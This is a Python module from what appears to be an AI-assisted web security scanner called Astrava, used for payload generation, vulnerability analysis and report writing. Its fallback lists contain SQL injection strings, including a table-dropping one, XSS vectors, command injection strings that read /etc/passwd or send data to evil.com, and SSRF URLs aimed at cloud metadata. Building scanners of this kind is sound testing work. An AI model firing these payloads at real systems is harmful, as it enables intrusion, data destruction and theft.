"""
AI Engine for Astrava Security Scanner
Handles all AI-related operations using Ollama and API providers
Optimized with chunked/streaming requests to reduce memory pressure
"""

import aiohttp
import json
import asyncio
from typing import Dict, List, Optional, Any
import logging
import time

from utils.ollama_manager import OllamaManager
from utils.model_manager import ModelManager
from utils.ai_chunker import AIChunker, analyze_vulnerabilities_chunked, generate_payloads_chunked

# Request throttling to prevent overwhelming Ollama
_last_request_time = 0
_min_request_interval = 0.3  # Minimum 300ms between requests

class AIEngine:
    """AI Engine for generating payloads, analyzing results, and creating reports"""
    
    def __init__(self, model: str = "llama3.2:3b", ollama_url: str = "http://localhost:11434"):
        self.model = model
        self.ollama_url = ollama_url
        self.logger = logging.getLogger(__name__)
        self.session = None
        
        # Initialize Model Manager for routing to Ollama or API providers
        self.model_manager = ModelManager(self.logger)
        self.model_manager.initialize()
        
        # Enable streaming for Ollama to reduce memory pressure
        self.use_streaming = True
        
        # Initialize AI Chunker for processing large data
        self.chunker = AIChunker(chunk_size=2000, max_concurrent=3)
        
        # Payload cache - reuse results across Phase 2 and Phase 3
        # Key: (payload_type, url) → Value: list of payloads
        self._payload_cache: Dict[str, List[str]] = {}
    
    async def __aenter__(self):
        """Async context manager entry"""
        self.session = aiohttp.ClientSession(
            timeout=aiohttp.ClientTimeout(total=120, connect=10)
        )
        return self
    
    async def __aexit__(self, exc_type, exc_val, exc_tb):
        """Async context manager exit"""
        if self.session:
            await self.session.close()
    
    async def validate_connection(self) -> bool:
        """Validate connection to Ollama"""
        try:
            async with aiohttp.ClientSession() as session:
                async with session.get(f"{self.ollama_url}/api/tags", timeout=5) as response:
                    if response.status == 200:
                        data = await response.json()
                        models = [model['name'] for model in data.get('models', [])]
                        return self.model in models
            return False
        except Exception as e:
            self.logger.error(f"Failed to connect to Ollama: {e}")
            return False
    
    async def query_ai(self, prompt: str, system_prompt: str = "", temperature: float = 0.7) -> str:
        """
        Query AI through Model Manager (routes to Ollama or API providers) with comprehensive error handling.
        Includes request throttling to prevent overwhelming Ollama.
        This is the new unified interface that replaces direct query_llama() calls.
        
        Implements Requirements 8.6, 15.1, 15.2, 15.3, 15.4, 15.5 for error handling and fallback logic.
        
        Args:
            prompt: The user prompt/question
            system_prompt: Optional system prompt for context
            temperature: Temperature parameter for response randomness (0.0-1.0)
            
        Returns:
            str: AI response text, or empty string on failure (allows scan to continue)
            
        Validates:
            Requirements 5.8, 8.6, 9.6, 15.1, 15.2, 15.3, 15.4, 15.5
        """
        global _last_request_time
        
        try:
            # Throttle requests to prevent overwhelming Ollama
            current_time = time.time()
            time_since_last = current_time - _last_request_time
            if time_since_last < _min_request_interval:
                await asyncio.sleep(_min_request_interval - time_since_last)
            _last_request_time = time.time()
            
            # Check if AI features are available before attempting query
            if not self.model_manager.is_ai_available():
                # Requirement 15.1: Log warning when AI features are disabled (only once)
                if not hasattr(self, '_ai_disabled_logged'):
                    self.logger.warning("AI features are disabled - no Ollama models or API keys configured")
                    print("INFO: AI features disabled - continuing without AI analysis")
                    self._ai_disabled_logged = True
                return ""
            
            # Route through Model Manager with comprehensive error handling
            response = await asyncio.to_thread(
                self.model_manager.query,
                prompt=prompt,
                system_prompt=system_prompt,
                temperature=temperature
            )
            
            if response:
                return response
            else:
                # Empty response indicates failure - don't spam console
                self.logger.debug("AI query returned empty response")
                return ""
                
        except Exception as e:
            # Requirement 8.6: Log error when AI request fails (only once per error type)
            error_key = f"{e.__class__.__name__}"
            if not hasattr(self, '_logged_errors'):
                self._logged_errors = set()
            
            if error_key not in self._logged_errors:
                self.logger.error(f"Error querying AI: {e}")
                print(f"INFO: AI query failed ({e.__class__.__name__}) - continuing without AI analysis")
                self._logged_errors.add(error_key)
            
            return ""
    
    async def query_llama(self, prompt: str, system_prompt: str = "", temperature: float = 0.7) -> str:
        """
        Query Ollama with streaming support — returns empty string on any failure (scan continues).
        Uses chunked/streaming responses to reduce memory pressure on Ollama.
        
        DEPRECATED: This method is maintained for backward compatibility.
        New code should use query_ai() which routes through Model Manager.
        """
        try:
            payload = {
                "model": self.model,
                "prompt": f"System: {system_prompt}\n\nUser: {prompt}",
                "stream": self.use_streaming,  # Enable streaming for chunked responses
                "options": {
                    "temperature": temperature,
                    "top_p": 0.9,
                    "top_k": 40,
                    "num_predict": 512  # Limit response length to reduce load
                }
            }

            if not self.session or self.session.closed:
                self.session = aiohttp.ClientSession(
                    timeout=aiohttp.ClientTimeout(total=400, connect=10)
                )

            # Per-request timeout: 60 seconds
            async with self.session.post(
                f"{self.ollama_url}/api/generate",
                json=payload,
                timeout=aiohttp.ClientTimeout(total=60)
            ) as response:
                if response.status == 200:
                    if self.use_streaming:
                        # Process streaming response chunk by chunk
                        full_response = ""
                        async for line in response.content:
                            if line:
                                try:
                                    chunk = json.loads(line.decode('utf-8'))
                                    if 'response' in chunk:
                                        full_response += chunk['response']
                                    if chunk.get('done', False):
                                        break
                                except json.JSONDecodeError:
                                    continue
                        return full_response.strip()
                    else:
                        # Non-streaming response
                        result = await response.json()
                        return result.get('response', '').strip()
                else:
                    body = await response.text()
                    msg = f"HTTP {response.status}: {body[:200]}"
                    self.logger.error(f"Ollama API error: {msg}")
                    print(f"WARNING: Ollama API error — {msg}")
                    return ""
        except aiohttp.ClientConnectorError as e:
            self.logger.warning(f"Ollama not reachable: {e}")
            print(f"INFO: Ollama service appears down. Attempting to auto-start...")
            
            # Try to start Ollama in a background thread so we don't block the async loop
            manager = OllamaManager(self.logger)
            success, msg = await asyncio.to_thread(manager.initialize, auto_download=True)
            
            if success:
                print(f"INFO: Ollama started successfully! Retrying request...")
                try:
                    async with self.session.post(
                        f"{self.ollama_url}/api/generate",
                        json=payload,
                        timeout=aiohttp.ClientTimeout(total=60)
                    ) as retry_resp:
                        if retry_resp.status == 200:
                            if self.use_streaming:
                                full_response = ""
                                async for line in retry_resp.content:
                                    if line:
                                        try:
                                            chunk = json.loads(line.decode('utf-8'))
                                            if 'response' in chunk:
                                                full_response += chunk['response']
                                            if chunk.get('done', False):
                                                break
                                        except json.JSONDecodeError:
                                            continue
                                return full_response.strip()
                            else:
                                result = await retry_resp.json()
                                return result.get('response', '').strip()
                except Exception as retry_e:
                    print(f"WARNING: Ollama retry failed ({retry_e.__class__.__name__}) — continuing without AI")
            else:
                print(f"WARNING: Failed to auto-start Ollama: {msg} — continuing without AI")
                
            return ""
        except asyncio.TimeoutError:
            self.logger.warning("Ollama request timed out after 60s — continuing without AI")
            print("WARNING: Ollama timed out — continuing without AI")
            return ""
        except Exception as e:
            self.logger.error(f"Error querying Ollama: {e.__class__.__name__}: {e}")
            print(f"WARNING: Ollama error ({e.__class__.__name__}: {e}) — continuing without AI")
            return ""
    
    async def generate_sql_payloads(self, target_info: Dict[str, Any]) -> List[str]:
        """
        Generate SQL injection payloads using AI with fallback to default payloads.
        Caches results so Phase 3 (OWASP) reuses Phase 2 (Vuln Scan) payloads.
        Uses chunked generation for large payload sets.
        """
        # Check cache first - reuse if already generated for this URL
        cache_key = f"sql_{target_info.get('url', 'unknown')}"
        if cache_key in self._payload_cache:
            self.logger.info("Reusing cached SQL payloads (already generated in Phase 2)")
            return self._payload_cache[cache_key]
        
        # Ultra-short prompt to prevent timeouts
        system_prompt = "List SQL payloads."
        prompt = f"5 SQL injection tests for {target_info.get('url', 'Unknown')[:30]}"
        
        try:
            response = await asyncio.wait_for(
                self.query_ai(prompt, system_prompt, temperature=0.8),
                timeout=10  # Reduced to 10 seconds
            )
            
            if response:
                payloads = [line.strip() for line in response.split('\n') if line.strip() and not line.startswith('#')]
                if payloads:
                    result = payloads[:10]
                    self.logger.info(f"AI generated {len(result)} SQL payloads")
                else:
                    raise ValueError("No payloads in response")
            else:
                raise ValueError("Empty AI response")
                
        except (asyncio.TimeoutError, ValueError, Exception) as e:
            self.logger.info(f"AI payload generation failed ({e.__class__.__name__}), using defaults")
            result = [
                "' OR '1'='1",
                "' UNION SELECT NULL--",
                "'; DROP TABLE users--",
                "' AND (SELECT COUNT(*) FROM information_schema.tables)>0--",
                "' OR SLEEP(5)--",
                "' OR pg_sleep(5)--",
                "' WAITFOR DELAY '0:0:5'--",
                "' AND 1=CONVERT(int, (SELECT @@version))--",
                "' UNION SELECT username, password FROM users--",
                "' OR 1=1 LIMIT 1--"
            ]
        
        # Cache the result for reuse in OWASP phase
        if 'chunk_id' not in target_info:
            self._payload_cache[cache_key] = result
        
        return result
    
    async def generate_sql_payloads_chunked(
        self,
        target_info: Dict[str, Any],
        total_payloads: int = 50,
        payloads_per_chunk: int = 10
    ) -> List[str]:
        """
        Generate large sets of SQL payloads using chunked processing.
        
        Args:
            target_info: Target information
            total_payloads: Total number of payloads to generate
            payloads_per_chunk: Payloads to generate per chunk
            
        Returns:
            List of generated payloads
        """
        self.logger.info(f"Generating {total_payloads} SQL payloads in chunks of {payloads_per_chunk}")
        
        payloads = await generate_payloads_chunked(
            target_info,
            self.generate_sql_payloads,
            total_payloads=total_payloads,
            payloads_per_chunk=payloads_per_chunk,
            parallel=True
        )
        
        self.logger.info(f"Generated {len(payloads)} SQL payloads")
        return payloads
    
    async def generate_xss_payloads(self, target_info: Dict[str, Any]) -> List[str]:
        """
        Generate XSS payloads using AI with fallback to default payloads.
        Caches results so Phase 3 (OWASP) reuses Phase 2 (Vuln Scan) payloads.
        """
        # Check cache first
        cache_key = f"xss_{target_info.get('url', 'unknown')}"
        if cache_key in self._payload_cache:
            self.logger.info("Reusing cached XSS payloads (already generated in Phase 2)")
            return self._payload_cache[cache_key]
        
        # Ultra-short prompt
        system_prompt = "List XSS payloads."
        prompt = f"5 XSS tests for {target_info.get('url', 'Unknown')[:30]}"
        
        try:
            response = await asyncio.wait_for(
                self.query_ai(prompt, system_prompt, temperature=0.8),
                timeout=10
            )
            
            if response:
                payloads = [line.strip() for line in response.split('\n') if line.strip() and not line.startswith('#')]
                if payloads:
                    result = payloads[:10]
                    self.logger.info(f"AI generated {len(result)} XSS payloads")
                else:
                    raise ValueError("No payloads in response")
            else:
                raise ValueError("Empty AI response")
                
        except (asyncio.TimeoutError, ValueError, Exception) as e:
            self.logger.info(f"AI payload generation failed ({e.__class__.__name__}), using defaults")
            result = [
                "<script>alert('XSS')</script>",
                "<img src=x onerror=alert('XSS')>",
                "<svg onload=alert('XSS')>",
                "javascript:alert('XSS')",
                "<iframe src=javascript:alert('XSS')>",
                "<body onload=alert('XSS')>",
                "<input onfocus=alert('XSS') autofocus>",
                "<select onfocus=alert('XSS') autofocus>",
                "<textarea onfocus=alert('XSS') autofocus>",
                "<keygen onfocus=alert('XSS') autofocus>"
            ]
        
        if 'chunk_id' not in target_info:
            self._payload_cache[cache_key] = result
        
        return result
    
    async def generate_xss_payloads_chunked(
        self,
        target_info: Dict[str, Any],
        total_payloads: int = 50,
        payloads_per_chunk: int = 10
    ) -> List[str]:
        """Generate large sets of XSS payloads using chunked processing."""
        self.logger.info(f"Generating {total_payloads} XSS payloads in chunks of {payloads_per_chunk}")
        
        payloads = await generate_payloads_chunked(
            target_info,
            self.generate_xss_payloads,
            total_payloads=total_payloads,
            payloads_per_chunk=payloads_per_chunk,
            parallel=True
        )
        
        self.logger.info(f"Generated {len(payloads)} XSS payloads")
        return payloads
    
    async def generate_command_injection_payloads(self, target_info: Dict[str, Any]) -> List[str]:
        """
        Generate command injection payloads using AI with fallback to default payloads.
        Caches results so Phase 3 (OWASP) reuses Phase 2 (Vuln Scan) payloads.
        """
        # Check cache first
        cache_key = f"cmd_{target_info.get('url', 'unknown')}"
        if cache_key in self._payload_cache:
            self.logger.info("Reusing cached command injection payloads (already generated in Phase 2)")
            return self._payload_cache[cache_key]
        
        # Ultra-short prompt
        system_prompt = "List command injection payloads."
        prompt = f"5 command tests for {target_info.get('url', 'Unknown')[:30]}"
        
        try:
            response = await asyncio.wait_for(
                self.query_ai(prompt, system_prompt, temperature=0.8),
                timeout=10
            )
            
            if response:
                payloads = [line.strip() for line in response.split('\n') if line.strip() and not line.startswith('#')]
                if payloads:
                    result = payloads[:10]
                    self.logger.info(f"AI generated {len(result)} command injection payloads")
                else:
                    raise ValueError("No payloads in response")
            else:
                raise ValueError("Empty AI response")
                
        except (asyncio.TimeoutError, ValueError, Exception) as e:
            self.logger.info(f"AI payload generation failed ({e.__class__.__name__}), using defaults")
            result = [
                "; ls -la",
                "| whoami",
                "&& id",
                "; cat /etc/passwd",
                "| dir",
                "&& type C:\\Windows\\System32\\drivers\\etc\\hosts",
                "; sleep 5",
                "| ping -c 4 127.0.0.1",
                "&& timeout 5",
                "; curl http://evil.com/$(whoami)"
            ]
        
        self._payload_cache[cache_key] = result
        return result
    
    async def generate_ssrf_payloads(self, target_info: Dict[str, Any]) -> List[str]:
        """
        Generate SSRF payloads using AI with fallback to default payloads.
        Caches results so Phase 3 (OWASP) reuses Phase 2 (Vuln Scan) payloads.
        """
        # Check cache first
        cache_key = f"ssrf_{target_info.get('url', 'unknown')}"
        if cache_key in self._payload_cache:
            self.logger.info("Reusing cached SSRF payloads (already generated in Phase 2)")
            return self._payload_cache[cache_key]
        
        # Ultra-short prompt
        system_prompt = "List SSRF payloads."
        prompt = f"5 SSRF tests for {target_info.get('url', 'Unknown')[:30]}"
        
        try:
            response = await asyncio.wait_for(
                self.query_ai(prompt, system_prompt, temperature=0.8),
                timeout=10
            )
            
            if response:
                payloads = [line.strip() for line in response.split('\n') if line.strip() and not line.startswith('#')]
                if payloads:
                    result = payloads[:10]
                    self.logger.info(f"AI generated {len(result)} SSRF payloads")
                else:
                    raise ValueError("No payloads in response")
            else:
                raise ValueError("Empty AI response")
                
        except (asyncio.TimeoutError, ValueError, Exception) as e:
            self.logger.info(f"AI payload generation failed ({e.__class__.__name__}), using defaults")
            result = [
                "http://169.254.169.254/latest/meta-data/",
                "http://metadata.google.internal/computeMetadata/v1/",
                "http://169.254.169.254/metadata/instance",
                "http://localhost:22",
                "http://127.0.0.1:3306",
                "http://0.0.0.0:6379",
                "file:///etc/passwd",
                "gopher://127.0.0.1:25/",
                "dict://127.0.0.1:11211/",
                "http://[::1]:80"
            ]
        
        self._payload_cache[cache_key] = result
        return result
    
    async def analyze_vulnerability(self, vuln_data: Dict[str, Any]) -> Dict[str, str]:
        """
        Analyze a vulnerability using AI with fallback to basic analysis.
        Uses streaming to reduce memory pressure on Ollama.
        
        Implements Requirements 15.4, 15.5 (continue scanning when AI features are disabled).
        """
        system_prompt = """You are a cybersecurity expert. Be extremely concise."""
        
        # Ultra-short prompt to prevent timeouts
        vuln_type = vuln_data.get('type', 'Unknown')
        severity = vuln_data.get('severity', 'Unknown')
        
        prompt = f"""
        {vuln_type} ({severity})
        
        In 50 words max:
        1. Risk (1 line)
        2. Fix (1 line)
        3. CVSS score
        """
        
        # Use shorter timeout for vulnerability analysis (60 seconds instead of 300)
        response = await self.query_ai(prompt, system_prompt, temperature=0.1)
        
        if response:
            # AI response available - try to parse it
            lines = [line.strip() for line in response.strip().split('\n') if line.strip()]
            
            # Try to extract structured information from the response
            explanation = ""
            impact = ""
            remediation = ""
            cvss_score = "7.5"
            
            # Look for numbered sections or parse the response intelligently
            for i, line in enumerate(lines):
                if i == 0 or "risk" in line.lower() or "explanation" in line.lower():
                    explanation = line
                elif "impact" in line.lower() or (i == 1 and not impact):
                    impact = line
                elif "fix" in line.lower() or "remediation" in line.lower() or (i == 2 and not remediation):
                    remediation = line
                elif any(char.isdigit() for char in line) and len(line) < 10:
                    # Likely a CVSS score
                    import re
                    score_match = re.search(r'(\d+\.?\d*)', line)
                    if score_match:
                        cvss_score = score_match.group(1)
            
            # Ensure we have meaningful content
            if not explanation:
                explanation = "Vulnerability detected requiring attention"
            if not impact:
                impact = "Potential security risk to the system"
            if not remediation:
                remediation = "Apply appropriate security patches and follow best practices"
            
            return {
                "explanation": explanation,
                "impact": impact,
                "remediation": remediation,
                "prevention": "Follow security best practices and regular assessments",
                "cvss_score": cvss_score
            }
        else:
            # AI not available - use basic analysis (Requirement 15.4, 15.5)
            self.logger.info("Using basic vulnerability analysis (AI not available)")
            vuln_type = vuln_data.get('type', 'Unknown').lower()
            severity = vuln_data.get('severity', 'Medium')
            
            # Basic analysis based on vulnerability type
            if 'sql' in vuln_type or 'injection' in vuln_type:
                return {
                    "explanation": "SQL injection vulnerability allows attackers to manipulate database queries. This can lead to unauthorized data access or modification.",
                    "impact": "Attackers may extract sensitive data, modify records, or gain administrative access.",
                    "remediation": "Use parameterized queries and input validation.",
                    "prevention": "Implement proper input sanitization and use prepared statements.",
                    "cvss_score": "8.5"
                }
            elif 'xss' in vuln_type or 'script' in vuln_type:
                return {
                    "explanation": "Cross-site scripting vulnerability allows injection of malicious scripts. User browsers may execute untrusted code.",
                    "impact": "Attackers may steal session cookies, redirect users, or perform actions on their behalf.",
                    "remediation": "Encode output and validate input data.",
                    "prevention": "Use Content Security Policy and proper output encoding.",
                    "cvss_score": "6.5"
                }
            elif 'command' in vuln_type:
                return {
                    "explanation": "Command injection vulnerability allows execution of arbitrary system commands. Server security may be compromised.",
                    "impact": "Attackers may gain shell access, read sensitive files, or compromise the entire system.",
                    "remediation": "Validate and sanitize all user inputs before command execution.",
                    "prevention": "Use safe APIs instead of system commands when possible.",
                    "cvss_score": "9.0"
                }
            else:
                # Generic analysis
                return {
                    "explanation": f"{vuln_data.get('type', 'Security')} vulnerability detected with {severity.lower()} severity. Manual review recommended.",
                    "impact": "Potential security risk that may allow unauthorized access or data exposure.",
                    "remediation": "Review and apply appropriate security patches or configuration changes.",
                    "prevention": "Follow security best practices and regular security assessments.",
                    "cvss_score": "7.0"
                }
    
    async def analyze_vulnerabilities_batch(
        self,
        vulnerabilities: List[Dict[str, Any]],
        chunk_size: int = 5,
        parallel: bool = False
    ) -> List[Dict[str, Any]]:
        """
        Analyze multiple vulnerabilities in chunks to prevent timeouts.
        
        Args:
            vulnerabilities: List of vulnerabilities to analyze
            chunk_size: Number of vulnerabilities per chunk (default 5)
            parallel: Whether to process chunks in parallel (default False for stability)
            
        Returns:
            List of vulnerabilities with AI analysis added
        """
        if not vulnerabilities:
            return []
        
        self.logger.info(f"Analyzing {len(vulnerabilities)} vulnerabilities in chunks of {chunk_size}")
        
        async def analyze_single(vuln):
            analysis = await self.analyze_vulnerability(vuln)
            vuln['ai_analysis'] = analysis
            return vuln
        
        # Use chunked processing
        analyzed = await analyze_vulnerabilities_chunked(
            vulnerabilities,
            analyze_single,
            chunk_size=chunk_size,
            parallel=parallel
        )
        
        self.logger.info(f"Completed analysis of {len(analyzed)} vulnerabilities")
        return analyzed
    
    async def generate_chain_attack(self, vulnerabilities: List[Dict[str, Any]]) -> List[Dict[str, Any]]:
        """
        Generate chain attack scenarios using AI with fallback to basic scenarios.
        
        Implements Requirements 15.4, 15.5 (continue scanning when AI features are disabled).
        """
        system_prompt = """You are a cybersecurity expert specializing in advanced persistent threats. 
        Analyze vulnerabilities and create realistic attack chain scenarios."""
        
        vuln_summary = "\n".join([
            f"- {v.get('type', 'Unknown')}: {v.get('severity', 'Unknown')} ({v.get('url', 'Unknown')})"
            for v in vulnerabilities
        ])
        
        prompt = f"""
        Given the following vulnerabilities, create realistic attack chain scenarios:
        
        {vuln_summary}
        
        For each attack chain:
        1. List the vulnerabilities used in order
        2. Describe the attack steps
        3. Explain the final objective
        4. Assess the overall impact
        
        Generate up to 3 attack chains. Format as JSON array with objects containing:
        chain_id, vulnerabilities_used, attack_steps, objective, impact
        """
        
        response = await self.query_ai(prompt, system_prompt, temperature=0.6)
        
        if response:
            # AI response available - try to parse JSON
            try:
                chains = json.loads(response)
                return chains if isinstance(chains, list) else []
            except json.JSONDecodeError:
                # JSON parsing failed, fall through to basic analysis
                pass
        
        # AI not available or parsing failed - generate basic attack chains (Requirement 15.4, 15.5)
        self.logger.info("Using basic attack chain analysis (AI not available)")
        
        if not vulnerabilities:
            return []
        
        # Create basic attack chains based on vulnerability types
        chains = []
        high_severity_vulns = [v for v in vulnerabilities if v.get('severity', '').lower() in ['high', 'critical']]
        
        if len(high_severity_vulns) >= 2:
            chains.append({
                "chain_id": "basic_chain_1",
                "vulnerabilities_used": [v.get('type', 'Unknown') for v in high_severity_vulns[:2]],
                "attack_steps": [
                    "1. Exploit first vulnerability to gain initial access",
                    "2. Use second vulnerability to escalate privileges",
                    "3. Establish persistence and exfiltrate data"
                ],
                "objective": "Gain unauthorized access and extract sensitive information",
                "impact": "Complete system compromise with data theft"
            })
        
        if len(vulnerabilities) >= 3:
            chains.append({
                "chain_id": "basic_chain_2", 
                "vulnerabilities_used": [v.get('type', 'Unknown') for v in vulnerabilities[:3]],
                "attack_steps": [
                    "1. Reconnaissance using first vulnerability",
                    "2. Initial compromise via second vulnerability", 
                    "3. Lateral movement using third vulnerability"
                ],
                "objective": "Multi-stage attack for comprehensive network compromise",
                "impact": "Widespread system access and potential data breach"
            })
        
        return chains
    
    async def generate_reconnaissance_analysis(self, recon_data: Dict[str, Any]) -> str:
        """
        Generate reconnaissance analysis using AI with fallback to basic analysis.
        Uses chunked processing for large reconnaissance data.
        
        Implements Requirements 15.4, 15.5 (continue scanning when AI features are disabled).
        """
        # Check if data is too large and needs chunking
        data_str = str(recon_data)
        if len(data_str) > 2000:  # Reduced from 3000
            return await self._generate_reconnaissance_analysis_chunked(recon_data)
        
        system_prompt = """Security expert. 2 lines max."""
        
        # Ultra-short prompt to prevent timeouts
        ports = recon_data.get('open_ports', [])
        tech = recon_data.get('technologies', [])
        
        prompt = f"""Target scan: {len(ports)} ports, {len(tech)} tech.
Main risk + action (2 lines):"""
        
        # Use longer timeout for reconnaissance (45 seconds)
        response = await self.query_ai_with_timeout(prompt, system_prompt, temperature=0.4, timeout=45)
        
        if response:
            return response
        else:
            # AI not available - generate basic analysis (Requirement 15.4, 15.5)
            # Don't log here - already logged in query_ai_with_timeout
            
            target = recon_data.get('target', 'Unknown')
            technologies = recon_data.get('technologies', [])
            open_ports = recon_data.get('open_ports', [])
            subdomains = recon_data.get('subdomains', [])
            security_headers = recon_data.get('security_headers', {})
            
            analysis = f"## Reconnaissance Analysis for {target}\n\n"
            
            # Security posture assessment
            analysis += "### Security Posture Assessment\n"
            if security_headers:
                missing_headers = []
                important_headers = ['Content-Security-Policy', 'X-Frame-Options', 'X-Content-Type-Options', 'Strict-Transport-Security']
                for header in important_headers:
                    if header not in security_headers:
                        missing_headers.append(header)
                
                if missing_headers:
                    analysis += f"- Missing important security headers: {', '.join(missing_headers)}\n"
                else:
                    analysis += "- Good security header implementation detected\n"
            else:
                analysis += "- No security headers information available\n"
            
            # Technology analysis
            analysis += "\n### Technology-Specific Risks\n"
            if technologies:
                for tech in technologies[:5]:  # Limit to first 5
                    analysis += f"- {tech}: Review for known vulnerabilities and misconfigurations\n"
            else:
                analysis += "- Technology stack not fully identified - manual analysis recommended\n"
            
            # Port analysis
            analysis += "\n### Open Ports Analysis\n"
            if open_ports:
                risky_ports = [port for port in open_ports if port in [21, 22, 23, 25, 53, 80, 110, 143, 443, 993, 995, 3389]]
                if risky_ports:
                    analysis += f"- Potentially risky open ports detected: {', '.join(map(str, risky_ports))}\n"
                analysis += f"- Total open ports: {len(open_ports)}\n"
            else:
                analysis += "- No open ports information available\n"
            
            # Subdomain analysis
            analysis += "\n### Attack Surface\n"
            if subdomains:
                analysis += f"- {len(subdomains)} subdomains discovered - expanded attack surface\n"
                analysis += "- Each subdomain should be individually assessed for vulnerabilities\n"
            else:
                analysis += "- Limited subdomain enumeration - consider deeper reconnaissance\n"
            
            # Recommendations
            analysis += "\n### Recommendations\n"
            analysis += "- Conduct vulnerability scanning on all discovered services\n"
            analysis += "- Test for common web application vulnerabilities (OWASP Top 10)\n"
            analysis += "- Review SSL/TLS configuration and certificate validity\n"
            analysis += "- Perform authentication and authorization testing\n"
            analysis += "- Consider social engineering and physical security assessment\n"
            
            return analysis
    
    async def query_ai_with_timeout(self, prompt: str, system_prompt: str = "", temperature: float = 0.7, timeout: int = 30) -> str:
        """
        Query AI with custom timeout to prevent repeated error messages.
        Shows error message only once per call.
        """
        try:
            # Check if AI features are available before attempting query
            if not self.model_manager.is_ai_available():
                self.logger.warning("AI features disabled - continuing without AI analysis")
                print("INFO: AI analysis skipped (no AI configured)")
                return ""
            
            # Route through Model Manager with custom timeout
            response = await asyncio.to_thread(
                self.model_manager.query,
                prompt=prompt,
                system_prompt=system_prompt,
                temperature=temperature,
                timeout=timeout
            )
            
            if response:
                return response
            else:
                self.logger.warning("AI query returned empty - continuing without AI analysis")
                print("INFO: AI analysis skipped (empty response)")
                return ""
                
        except Exception as e:
            self.logger.error(f"AI query error: {e}")
            print(f"INFO: AI analysis skipped ({e.__class__.__name__})")
            return ""
    
    async def _generate_reconnaissance_analysis_chunked(self, recon_data: Dict[str, Any]) -> str:
        """
        Generate reconnaissance analysis for large datasets using chunked processing.
        """
        self.logger.info("Using chunked processing for large reconnaissance data")
        
        # Split data into minimal chunks
        chunks = []
        
        # Chunk 1: Basic info (minimal)
        chunk1 = {
            'target': recon_data.get('target'),
            'technologies': recon_data.get('technologies', [])[:10],  # Only first 10
            'security_headers': {}  # Skip headers to reduce size
        }
        chunks.append(('technologies', chunk1))
        
        # Chunk 2: Ports (minimal)
        chunk2 = {
            'target': recon_data.get('target'),
            'open_ports': recon_data.get('open_ports', [])[:20],  # Only first 20
        }
        chunks.append(('ports', chunk2))
        
        # Process each chunk with delay
        results = []
        for i, (chunk_type, chunk_data) in enumerate(chunks):
            if i > 0:
                await asyncio.sleep(1)  # 1 second delay between chunks
            
            try:
                analysis = await self.generate_reconnaissance_analysis(chunk_data)
                results.append(f"### {chunk_type.title()} Analysis\n{analysis}")
            except Exception as e:
                self.logger.error(f"Failed to analyze {chunk_type} chunk: {e}")
                continue
        
        # If all chunks failed, return basic analysis
        if not results:
            return await self.generate_reconnaissance_analysis({'target': recon_data.get('target')})
        
        # Combine results
        return "\n\n".join(results)
    
    async def generate_executive_summary(self, scan_results: Dict[str, Any]) -> str:
        """
        Generate executive summary using AI with fallback to basic summary.
        
        Implements Requirements 15.4, 15.5 (continue scanning when AI features are disabled).
        """
        system_prompt = """You are a cybersecurity consultant writing an executive summary for C-level executives. 
        Focus on business impact, risk levels, and strategic recommendations."""
        
        vulnerabilities = scan_results.get('vulnerabilities', [])
        risk_score = scan_results.get('risk_score', 0)
        
        vuln_counts = {}
        for vuln in vulnerabilities:
            severity = vuln.get('severity', 'Unknown')
            vuln_counts[severity] = vuln_counts.get(severity, 0) + 1
        
        prompt = f"""
        Create an executive summary for a security assessment with the following results:
        
        Target: {scan_results.get('target', 'Unknown')}
        Risk Score: {risk_score}/100
        Total Vulnerabilities: {len(vulnerabilities)}
        Vulnerability Breakdown: {vuln_counts}
        Scan Duration: {scan_results.get('scan_duration', 0)} seconds
        
        Include:
        1. Executive overview (2-3 sentences)
        2. Key findings and business risks
        3. Immediate action items
        4. Strategic recommendations
        5. Compliance implications (if any)
        
        Keep it concise and business-focused.
        """
        
        response = await self.query_ai(prompt, system_prompt, temperature=0.3)
        
        if response:
            return response
        else:
            # AI not available - generate basic summary (Requirement 15.4, 15.5)
            self.logger.info("Using basic executive summary (AI not available)")
            
            target = scan_results.get('target', 'Unknown')
            total_vulns = len(vulnerabilities)
            critical_count = vuln_counts.get('Critical', 0)
            high_count = vuln_counts.get('High', 0)
            medium_count = vuln_counts.get('Medium', 0)
            low_count = vuln_counts.get('Low', 0)
            
            # Calculate risk level
            if critical_count > 0:
                risk_level = "CRITICAL"
            elif high_count > 0:
                risk_level = "HIGH"
            elif medium_count > 0:
                risk_level = "MEDIUM"
            else:
                risk_level = "LOW"
            
            summary = f"""# Executive Summary - Security Assessment
            
## Target: {target}

### Executive Overview
A comprehensive security assessment was conducted on {target}, identifying {total_vulns} security vulnerabilities. The overall risk level is assessed as **{risk_level}** based on the severity and number of findings. Immediate attention is required to address critical security gaps and reduce organizational risk exposure.

### Key Findings
- **Total Vulnerabilities**: {total_vulns}
- **Risk Score**: {risk_score}/100
- **Severity Breakdown**:
  - Critical: {critical_count}
  - High: {high_count}
  - Medium: {medium_count}
  - Low: {low_count}

### Business Impact
"""
            
            if critical_count > 0:
                summary += f"- **IMMEDIATE RISK**: {critical_count} critical vulnerabilities pose severe security risks that could lead to data breaches, system compromise, or business disruption.\n"
            
            if high_count > 0:
                summary += f"- **HIGH PRIORITY**: {high_count} high-severity issues require prompt remediation to prevent potential security incidents.\n"
            
            if medium_count > 0:
                summary += f"- **MODERATE CONCERN**: {medium_count} medium-severity vulnerabilities should be addressed in the next security update cycle.\n"
            
            summary += """
### Immediate Action Items
1. **Patch Critical Vulnerabilities**: Address all critical-severity findings within 24-48 hours
2. **Security Review**: Conduct immediate security review of affected systems
3. **Incident Response**: Ensure incident response procedures are activated if needed
4. **Access Controls**: Review and strengthen authentication and authorization mechanisms

### Strategic Recommendations
1. **Security Program Enhancement**: Implement regular security assessments and vulnerability management
2. **Staff Training**: Provide security awareness training for development and operations teams
3. **Security Tools**: Deploy automated security scanning and monitoring solutions
4. **Compliance**: Ensure adherence to relevant security standards and regulations
5. **Third-Party Risk**: Review security practices of vendors and partners

### Next Steps
- Prioritize remediation based on risk severity and business impact
- Establish regular security assessment schedule
- Implement continuous monitoring and threat detection
- Consider engaging security professionals for ongoing support

*This assessment provides a snapshot of current security posture. Regular assessments are recommended to maintain security effectiveness.*
"""
            
            return summary
